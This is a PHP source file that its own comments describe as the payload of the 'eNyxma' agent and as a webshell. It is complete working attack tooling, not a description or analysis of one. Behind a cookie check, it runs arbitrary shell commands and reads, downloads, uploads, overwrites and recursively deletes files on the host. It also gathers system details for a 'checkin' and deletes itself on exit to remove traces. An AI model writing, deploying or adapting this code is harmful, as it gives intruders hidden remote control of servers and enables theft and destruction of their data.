<?php
// enyxma.php - Payload for eNyxma agent
// This script processes incoming GET or POST requests with an "id" field containing a Base64-encoded command.
// The command is decoded and processed according to its type.
// It returns the output encoded in Base64, wrapped in a JSON object.

// Placeholders (COOKIE_VALUE, COOKIE_NAME, PARAM) are expected to be replaced during the build process.
$cookie_value = "%COOKIE_VALUE%";  // Expected secret value for authentication
$cookie_name = "%COOKIE_NAME%";
$param_name = "%PARAM%";

// Validate that the authentication cookie is present and correct
if(!isset($_COOKIE[$cookie_name])){
	halt_request();
}
if($_COOKIE[$cookie_name] != base64_encode($cookie_value)){
	halt_request();
}

/**
 * halt_request
 * Aborts the request by calling abort_call()
 */
function halt_request() {
    // Abort the request with a generic error message to avoid exposing any details
    abort_call();
}

/**
 * handle_post_request
 * Reads the POST body, decodes the JSON, and processes the command.
 */
function handle_post_request() {
    // Read the raw POST body and decode it as JSON
    $raw_body = file_get_contents('php://input');
    $data = json_decode($raw_body, true);

    // Ensure that the expected parameter (placeholder %PARAM%) exists
    if (!isset($data["%PARAM%"])) {
        halt_request();
    }

    // Process the command from the provided parameter
    handle_request($data["%PARAM%"]);
}

/**
 * handle_get_request
 * Reads the GET parameter and processes the command.
 */
function handle_get_request() {
    // Ensure that the expected parameter (placeholder %PARAM%) is in the URL
    if (!isset($_GET["%PARAM%"])) {
        halt_request();
    }

    // Process the command from the GET parameter
    handle_request($_GET["%PARAM%"]);
}

/**
 * handle_request
 * Decodes the Base64-encoded command, parses its action and arguments,
 * and calls the corresponding process function based on the action.
 */
function handle_request($input) {
    // Decode the received Base64 command
    $command = base64_decode($input);
    $command = trim($command);

    // Split the command into parts to determine the action and its arguments
    $parts = preg_split('/\s+/', $command);
    $action = strtolower(array_shift($parts)); // Get the first word as action
    $args = implode(" ", $parts); // Remaining part is treated as arguments
    $output = "";

    // Process the command based on its action
    switch($action) {
        case "shell":
            // Command format: "shell command"
            $output = process_shell($args);
            break;
        case "download":
            // Command format: "download /path/to/file"
            $output = process_download($args);
            break;
        case "upload":
            // Command format: "upload /path/to/file file_content"
            $output = process_upload($args);
            break;
        case "list":
            // Command format: "list [directory]"
            $output = process_list($args);
            break;
        case "pwd":
            // Command format: "pwd"
            $output = process_pwd();
            break;
        case "whoami":
            // Command format: "whoami"
            $output = process_whoami();
            break;
        case "mkdir":
            // Command format: "mkdir /path/to/directory"
            $output = process_mkdir($args);
            break;
        case "read":
            // Command format: "read /path/to/file"
            $output = process_read($args);
            break;
        case "checkin":
            // Command format: "checkin"
            $output = process_checkin();
            break;
        case "append":
            // Command format: "append /path/to/file data"
            $output = process_append($args);
            break;
        case "write":
            // Command format: "write /path/to/file data"
            $output = process_write($args);
            break;
        case "create":
            // Command format: "create /path/to/file"
            $output = process_create($args);
            break;
        case "delete":
            // Command format: "delete /path/to/file"
            $output = process_delete($args);
            break;
        case "rmdir":
            // Command format: "rmdir /path/to/directory"
            $output = process_rmdir($args);
            break;
        case "exit":
            // Command format: "exit"
            $output = process_exit();
            break;
        default:
            // If action is unrecognized, halt the request
            halt_request();
    } 

    // Return the output encoded in Base64 inside a JSON object
    header('Content-Type: application/json');
    echo json_encode(['output' => base64_encode($output)]);
}

/**
 * process_shell
 * Executes a generic shell command using shell_exec and returns the output.
 */
function process_shell($command) {
    // Execute a generic shell command via shell_exec
    $output = shell_exec($command);

    // If command produced no output, return a 204 response with an error message.
    if ($output === null || $output === "") {
        http_response_code(204);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Command output is empty']);
        exit;
    }

    return $output;
}

/**
 * process_download
 * Downloads a file from the remote system.
 * It checks the file existence and readability, and returns the file content.
 */
function process_download($file_path) {
	$real_path = realpath($file_path);
	
    // Check if the file exists and can be read
    if ($real_path === false || !file_exists($real_path)) {
        http_response_code(204);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'File not found']);
        exit;
    }
    $content = file_get_contents($real_path);
    if ($content === false) {
        http_response_code(500);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Error reading file']);
        exit;
    }
    
    return $content;
}

/**
 * process_upload
 * Write a Base64‑encoded payload to a file on disk.
 * Expects $args = "<remote_path> <base64_content>"
 */
function process_upload($args) {
    // Split into target path and Base64 data
    $parts = preg_split('/\s+/', $args, 2);
    if (count($parts) < 2) {
        http_response_code(400);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Invalid upload parameters']);
        exit;
    }
    list($remote_path, $b64) = $parts;

    // Decode the file contents
    $data = base64_decode($b64, true);
    if ($data === false) {
        http_response_code(400);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Base64 decode failed']);
        exit;
    }

    // Attempt to write the file
    $written = @file_put_contents($remote_path, $data);
    if ($written === false) {
        http_response_code(500);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Failed to write file']);
        exit;
    }

    $output = "Uploaded to {$remote_path} ({$written} bytes)";
    return $output;
}

/**
 * process_list
 * Lists the contents of a directory using scandir.
 */
function process_list($directory) {
    // Verify that the directory exists
    if (!is_dir($directory)) {
        http_response_code(404);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Directory not found']);
        exit;
    }
    $files = scandir($directory);
    $output = implode("\n", $files);
	$output = "Listing contents of: " . realpath($directory) . "\n";
	$output = $output . "\tUID\tGID\tSize\tMTime\tName\n";
	foreach ($files as $item) {
		$curFile = stat($directory . "/" . $item);
		$curOutput = $curFile["uid"] . "\t" . $curFile["gid"] . "\t" . $curFile["size"] . "Bytes \t" . date("Y-m-d\TH:i:s\Z", $curFile["mtime"]) . "\t" . $item;
		$output = $output . "\n" . $curOutput;
	  }
	return $output;
}


/**
 * process_pwd
 * Retrieves and returns the current working directory.
 */
function process_pwd() {
    $cwd = getcwd();
    if ($cwd === false) {
        http_response_code(500);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Unable to get working directory']);
        exit;
    }
    return $cwd;
}

/**
 * process_whoami
 * Returns the effective username of the webshell process
 */
function process_whoami() {
    $output = get_current_user();
    return $output;
}

/**
 * process_mkdir
 * Creates a directory at the specified path.
 */
function process_mkdir($path) {
    if (empty($path)) {
        http_response_code(400);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Missing directory path']);
        exit;
    }
    if (@mkdir($path, 0755, true) === false) {
        http_response_code(500);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Failed to create directory']);
        exit;
    }
    return "Directory created: {$path}";
}

/**
 * process_read
 * Reads and returns the contents of the specified file.
 */
function process_read($file_path) {
	$real_path = realpath($file_path);
	
    // Check if the file exists and can be read
    if ($real_path === false || !file_exists($real_path)) {
        http_response_code(204);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'File not found']);
        exit;
    }
    $content = file_get_contents($real_path);
    if ($content === false) {
        http_response_code(500);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Error reading file']);
        exit;
    }
    
    return $content;
}

/**
 * process_checkin
 * Gathers basic system information and returns it as a pipe‑delimited string:
 *   IP address | OS | User | Hostname | Domain | PID | Architecture
 */
function process_checkin() {
    // 1. IP address of the server
    $ip = gethostbyname(gethostname());

    // 2. Operating system (e.g. Linux 4.19.0-21-amd64)
    $os = php_uname();

    // 3. Effective user running the PHP process
    //    get_current_user() returns the owner of the script
    $user = get_current_user();

    // 4. Hostname
    $host = gethostname();

    // 5. Domain – for most *nix we'll reuse the hostname; on Windows you could use COM or similar
    $domain = php_uname('n');

    // 6. PHP process ID
    $pid = getmypid();

    // 7. Machine architecture (e.g. x86_64)
    $arch = php_uname('m');

    // Build a pipe‑delimited string (empty first field to match agent’s parsing of "<TaskID>|checkin|…")
    // Note: the agent prepends its TaskID and the base64‑encoded "checkin", so here we just return the fields.
    return "{$ip}|{$os}|{$user}|{$host}|{$domain}|{$pid}|{$arch}";
}

/**
 * process_append
 * Append Base64‑decoded data to a file on disk.
 */
function process_append($args) {
    // Split into target path and Base64 payload
    $parts = preg_split('/\s+/', $args, 2);
    if (count($parts) < 2) {
        http_response_code(400);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Invalid append parameters']);
        exit;
    }
    list($remote_path, $b64) = $parts;

    // Decode the data
    $data = base64_decode($b64, true);
    if ($data === false) {
        http_response_code(400);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Base64 decode failed']);
        exit;
    }

    // Attempt to append to the file
    $written = @file_put_contents($remote_path, $data, FILE_APPEND);
    if ($written === false) {
        http_response_code(500);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Failed to append to file']);
        exit;
    }

    // Success
    return "Appended to {$remote_path} ({$written} bytes)";
}

/**
 * process_write
 * Overwrite a file with Base64‑decoded data.
 */
function process_write($args) {
    // Split into target path and Base64 payload
    $parts = preg_split('/\s+/', $args, 2);
    if (count($parts) < 2) {
        http_response_code(400);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Invalid write parameters']);
        exit;
    }
    list($remote_path, $b64) = $parts;

    // Decode the data
    $data = base64_decode($b64, true);
    if ($data === false) {
        http_response_code(400);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Base64 decode failed']);
        exit;
    }

    // Attempt to write (overwrite) the file
    $written = @file_put_contents($remote_path, $data);
    if ($written === false) {
        http_response_code(500);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Failed to write file']);
        exit;
    }

    // Success
    return "Written to {$remote_path} ({$written} bytes)";
}

/**
 * process_create
 * Creates a new empty file at the given path (or truncates an existing one).
 */
function process_create($file_path) {
    // Resolve to an absolute path
    $real_dir = dirname($file_path);
    if (!is_dir($real_dir)) {
        http_response_code(204);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Directory not found']);
        exit;
    }
    // Attempt to create or truncate the file
    $created = @file_put_contents($file_path, "");
    if ($created === false) {
        http_response_code(500);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Failed to create or truncate file']);
        exit;
    }
    return "Created file at {$file_path} (" . filesize($file_path) . " bytes)";
}

/**
 * process_delete
 * Deletes a file at the given path.
 */
function process_delete($file_path) {
    // Resolve real path
    $real = realpath($file_path);
    if ($real === false || !is_file($real)) {
        http_response_code(204);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'File not found']);
        exit;
    }
    // Attempt to unlink
    if (!@unlink($real)) {
        http_response_code(500);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Failed to delete file']);
        exit;
    }
    return "Deleted file {$real}";
}

/**
 * process_rmdir
 * Deletes a directory and all of its contents (recursively).
 */
function process_rmdir($dir_path) {
    // Resolve real path
    $real = realpath($dir_path);
    if ($real === false || !is_dir($real)) {
        http_response_code(204);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Directory not found']);
        exit;
    }
    // Recursive removal helper
    $removeDir = function($path) use (&$removeDir) {
        $items = array_diff(scandir($path), ['.', '..']);
        foreach ($items as $item) {
            $sub = $path . DIRECTORY_SEPARATOR . $item;
            if (is_dir($sub)) {
                $removeDir($sub);
            } else {
                @unlink($sub);
            }
        }
        @rmdir($path);
    };
    // Perform recursive delete
    $removeDir($real);
    if (file_exists($real)) {
        http_response_code(500);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Failed to remove directory']);
        exit;
    }
    return "Removed directory {$real} and all its contents";
}

/**
 * process_exit
 * Terminates the webshell session and deletes el propio script.
 */
function process_exit() {
    $self = __FILE__;
    @unlink($self);
    return "Webshell removed, exiting.";
}


// Determine the request method and call the appropriate function
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    handle_post_request();
} elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
    handle_get_request();
} else {
    halt_request();
}
?>